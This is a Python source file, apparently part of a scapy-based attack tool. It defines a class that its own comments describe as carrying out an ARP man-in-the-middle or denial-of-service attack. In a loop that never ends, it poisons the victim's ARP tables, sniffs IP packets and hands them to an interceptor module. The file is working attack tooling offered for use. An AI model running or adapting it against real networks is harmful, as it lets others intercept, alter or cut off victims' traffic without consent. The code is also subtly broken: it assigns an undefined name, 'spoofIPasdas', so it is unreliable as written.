from scapy.all import *
import arpSpoof
import util
import interceptor

# Create objects to perfrom ARP mitm attack or ARP DOS attack
# inp : networkInterface = str
# inp : victimIP = arr of str
# inp : spoofIP = arr of str
# inp : forward = bool
# call start on object to start the attack
class Arp():
    def __init__(self, networkInterface, victimIP, spoofIP, forward):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIPasdas
        self.forward = forward
        self.attackerMAC = get_if_hwaddr(networkInterface)
        self.victimMAC = util.getMAC(victimIP, networkInterface)
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]

    # sniff for IP packets on the networkInterface
    def startSniff(self):
        sniff(prn=self.intercept, iface=self.networkInterface, filter="ip", timeout = 20)

    def intercept(self, pkt):
         interceptor.interceptARP(pkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface, self.forward)

    # poison arp tables
    def spoof(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)

    def start(self):
        while (True):
            self.spoof()
            self.startSniff()
